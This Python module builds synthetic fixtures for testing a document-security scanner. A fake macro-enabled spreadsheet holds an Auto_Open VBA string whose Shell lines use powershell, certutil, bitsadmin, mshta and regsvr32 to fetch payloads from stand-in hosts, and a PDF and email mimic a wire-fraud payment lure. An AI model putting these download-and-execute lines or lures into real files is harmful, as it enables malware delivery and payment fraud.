"""Small, deterministic security protocol fixtures safe to commit.

These artifacts contain inert strings for parser/policy tests. They are not
malware, real customer documents, provider certification samples, or evidence
that a sandbox/runtime detector observed execution.
"""
from __future__ import annotations

import io
import zipfile
from pathlib import Path


SYNTHETIC_AUTHORITY = "synthetic_protocol_only"

_XLSM_TEXT = """
HARBOURSIDE CAPITAL PARTNERS
STRICTLY CONFIDENTIAL BENIGN SECURITY PROTOCOL FIXTURE
Enable macros to view the acquisition model.
WIRE TRANSFER INSTRUCTIONS - DEPOSIT PAYMENT
Amount AUD $85,000.00 Beneficiary Example Test Supplier
BSB 012-456 Account Number 8877 3421
""".strip()

_VBA_TEXT = """
Attribute VB_Name = "ProtocolFixture"
Sub Auto_Open()
Shell "powershell -enc dGVzdA=="
Shell "certutil -urlcache -split -f http://example.invalid/payload.exe temp.exe"
Shell "bitsadmin /transfer protocol http://test-c2.example.invalid/payload.exe temp.exe"
Shell "mshta http://example.invalid/test.hta"
Shell "regsvr32 /i:http://example.invalid/test.sct scrobj.dll"
' BENIGN beacon callback check-in interval=300 for protocol classification only
End Sub
' BENIGN TEST STRINGS ONLY - NEVER EXECUTED
""".strip()

_COMMENT_ONLY_BAS = """
Attribute VB_Name = "SecurityModule"
' BENIGN TEST - no functional malicious code.
' powershell -enc reference-only
' certutil -decode reference-only
' Expected: unknown / suppressed.
""".strip()

_PDF_TEXT = """
WIRE TRANSFER AUTHORIZATION
BENIGN SECURITY PROTOCOL FIXTURE
Amount AUD $85,000.00
Beneficiary Example Test Supplier
BSB 012-456
Account Number 8877 3421
Process within 4 hours of receipt.
""".strip()


def synthetic_xlsm_bytes() -> bytes:
    """Return a minimal OOXML-like zip with inert macro indicator strings."""
    output = io.BytesIO()
    with zipfile.ZipFile(output, "w", compression=zipfile.ZIP_DEFLATED) as archive:
        archive.writestr(
            "xl/sharedStrings.xml",
            (
                '<?xml version="1.0" encoding="UTF-8"?>'
                '<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">'
                f"<si><t>{_XLSM_TEXT}</t></si></sst>"
            ),
        )
        archive.writestr("xl/vbaProject.bin", _VBA_TEXT.encode("ascii"))
    return output.getvalue()


def synthetic_pdf_bytes() -> bytes:
    """Return PDF-like bytes understood by the bounded fallback text parser."""
    text_ops = "\n".join(f"({line}) Tj" for line in _PDF_TEXT.splitlines())
    return (
        "%PDF-1.4\n1 0 obj\n<< /Type /Page >>\nstream\n"
        f"{text_ops}\nendstream\nendobj\n%%EOF\n"
    ).encode("ascii")


def synthetic_comment_only_bas_bytes() -> bytes:
    return _COMMENT_ONLY_BAS.encode("utf-8")


def synthetic_eml_bytes() -> bytes:
    return (
        "From: accounts@example.test\r\n"
        "To: buyer@example.test\r\n"
        "Subject: Updated payment details\r\n"
        "MIME-Version: 1.0\r\n"
        "Content-Type: text/plain; charset=utf-8\r\n\r\n"
        "Please use the new beneficiary and BSB in the attached invoice. "
        "Verify this benign protocol fixture out of band.\r\n"
    ).encode("utf-8")


def bytes_for_legacy_fixture(path: str | Path) -> bytes:
    """Map known ignored legacy filenames to portable protocol artifacts."""
    name = Path(path).name.lower()
    if name.endswith(".xlsm"):
        return synthetic_xlsm_bytes()
    if name.endswith(".pdf"):
        return synthetic_pdf_bytes()
    if name.endswith(".bas"):
        return synthetic_comment_only_bas_bytes()
    raise KeyError(f"no_synthetic_protocol_fixture:{name}")
